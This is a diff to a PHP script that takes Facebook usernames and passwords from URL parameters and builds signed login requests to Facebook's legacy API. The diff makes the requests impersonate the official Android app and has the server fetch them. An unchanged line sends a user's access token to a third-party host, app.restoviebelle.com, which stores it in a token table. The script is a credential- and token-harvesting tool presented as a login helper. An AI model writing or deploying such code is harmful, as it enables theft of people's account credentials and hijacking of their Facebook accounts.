@@ -6,7 +6,7 @@ function curl_download($Url,$fields = false){
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com");
-    curl_setopt($ch, CURLOPT_USERAGENT, "MozillaXYZ/1.0");
+    curl_setopt($ch, CURLOPT_USERAGENT, "[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]");
     curl_setopt($ch, CURLOPT_HEADER, 0);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     if($fields and count($fields) > 0){
@@ -44,7 +44,8 @@ function getLoginUrl($user, $pass, $type="android")
     return "https://api.facebook.com/restserver.php?".$Mapp."&sig=".md5($mdtet);
 }
 if(!isset($_GET["token"])){
-echo json_encode(array("data"=>getLoginUrl($_GET["user"],$_GET["pass"])));
+//echo json_encode(array("data"=>getLoginUrl($_GET["user"],$_GET["pass"])));
+echo json_encode(Json(getLoginUrl($_GET["user"],$_GET["pass"])));
 }else{
   if(!isset($_GET["check"])){  
 echo json_encode(array("data"=>Json("https://app.restoviebelle.com/json.php?&table=access_token&set=number,token&val=".$_GET["token"])["success"])); 
